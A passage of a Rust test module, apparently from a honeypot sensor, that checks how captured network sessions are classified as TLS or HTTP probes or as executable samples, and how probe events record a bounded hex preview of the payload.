            vec![0xfe, 0xed, 0xfa, 0xcf, 0, 0, 0, 0],
            vec![0xce, 0xfa, 0xed, 0xfe, 0, 0, 0, 0],
            vec![0xcf, 0xfa, 0xed, 0xfe, 0, 0, 0, 0],
        ] {
            assert_eq!(verdict(&hello, 500, &payload), None, "{payload:02x?}");
        }
    }

    /// Size is only ever a reason to KEEP a sample: a probe shape that has received more than
    /// the ceiling is not demoted, and no size floor exists (a tiny stub is a real dropper, see
    /// `real_payloads_and_logins_are_not_probes`).
    #[test]
    fn a_session_over_the_size_ceiling_is_a_sample_even_if_it_opens_like_a_probe() {
        let hello = tls_hello();
        assert_eq!(
            verdict(&hello, MAX_PROBE_WIRE_BYTES, &[]),
            Some(ProbeProtocol::Tls)
        );
        assert_eq!(verdict(&hello, MAX_PROBE_WIRE_BYTES + 1, &[]), None);
    }

    #[test]
    fn the_probe_event_is_a_sampleless_probe_signal_with_the_protocol_and_a_bounded_preview() {
        let head = tls_hello();
        let session = Uuid::now_v7();
        let event = probe_event(
            "203.0.113.7".parse().unwrap(),
            None,
            session,
            ProbeProtocol::Tls,
            &head,
            head.len() as u64,
        );
        assert_eq!(event.signal_type, SIGNAL_CATCHALL_PROBE);
        assert_eq!(event.sensor, "telnet");
        assert!(event.sample.is_none(), "a probe is never a sample");
        assert!(!event.authenticated);
        assert_eq!(event.session_id, Some(session));
        assert_eq!(event.metadata["capture_reason"], "probe_payload");
        assert_eq!(event.metadata["probe_protocol"], "tls");
        assert_eq!(event.metadata["observed_len"], head.len() as u64);
        assert!(
            event.metadata["payload_hex"]
                .as_str()
                .unwrap()
                .starts_with("160301")
        );

        let long = filler(HEAD_CAP + 100);
        let event = probe_event(
            "203.0.113.7".parse().unwrap(),
            None,
            session,
            ProbeProtocol::Http,
            &long,
            9999,
        );
        assert_eq!(
            event.metadata["payload_hex"].as_str().unwrap().len(),
            HEAD_CAP * 2
        );
        assert_eq!(event.metadata["observed_len"], 9999);
    }

    proptest! {
        /// Classification never panics on any bytes, and nothing that starts like an executable
        /// is ever a probe, however it is followed.
        #[test]
        fn an_elf_start_is_never_a_probe(tail in proptest::collection::vec(any::<u8>(), 0..300)) {
            let bytes = cat(&[b"\x7fELF", &tail]);
            prop_assert_eq!(verdict(&bytes, bytes.len() as u64, &[]), None);
        }

        #[test]
        fn classify_never_panics(bytes in proptest::collection::vec(any::<u8>(), 0..400)) {
            let _ = classify(&bytes);
            let _ = verdict(&bytes, bytes.len() as u64, &bytes);
        }
    }
}
